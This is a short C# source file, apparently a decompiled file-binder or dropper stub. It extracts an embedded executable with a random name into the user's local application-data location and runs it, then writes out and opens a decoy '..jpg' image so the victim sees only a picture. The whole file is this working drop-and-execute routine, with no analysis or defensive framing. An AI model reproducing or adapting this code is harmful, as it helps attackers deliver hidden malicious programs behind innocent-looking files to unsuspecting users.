using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;

namespace Bound;

internal static class Open
{
	private static void Main()
	{
		try
		{
			ResourceManager resourceManager = new ResourceManager("files", Assembly.GetExecutingAssembly());
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "MmcUtawNtF.exe", (byte[])resourceManager.GetObject("UAripZF_EO"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "MmcUtawNtF.exe");
			File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "UhJIXeaOQZ..jpg", (byte[])resourceManager.GetObject("TzBPAhoC_p"));
			Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "UhJIXeaOQZ..jpg");
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex.Message);
			Console.Read();
		}
	}
}
